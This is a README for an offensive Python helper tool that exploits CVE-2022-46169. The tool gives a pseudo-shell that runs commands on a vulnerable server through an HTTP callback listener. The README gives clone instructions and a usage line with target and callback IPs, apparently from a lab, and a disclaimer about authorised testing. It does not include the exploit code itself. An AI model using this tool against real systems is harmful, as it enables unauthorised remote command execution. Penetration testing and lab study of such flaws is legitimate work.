# CVE-2022-46169 Pseudo Shell
## Description
This Python script serves as a helper tool to streamline the process of exploiting the CVE-2022-46169 vulnerability. It starts an HTTP server that listens for incoming requests and provides a simple interface for the user to input commands. These commands are then executed on the target server, automating the process of sending crafted payloads to a vulnerable server and observing the server's responses in real-time.

By leveraging this script, a user can automate the process of sending crafted payloads to a vulnerable server and observe the server's responses in real-time.

## Download
```
git clone git@github.com:ahanel13/ImprovedShell-for-CVE-2022-46169.git
cd ImprovedShell-for-CVE-2022-46169
python CVE-2022-46169_helper.py -h
```

## Usage
```
python3 CVE-2022-46169_helper.py --target http://10.10.11.211 --ip 10.10.14.86 --port 5000
```
![Improved Shell Example](https://github.com/ahanel13/ImprovedShell-for-CVE-2022-46169/assets/47185077/bb38210e-26ed-4407-8706-3c1ea5f80a9d)

## Note
This script is intended for educational purposes and lawful use only. Always obtain proper authorization before performing any kind of penetration testing or security assessment.
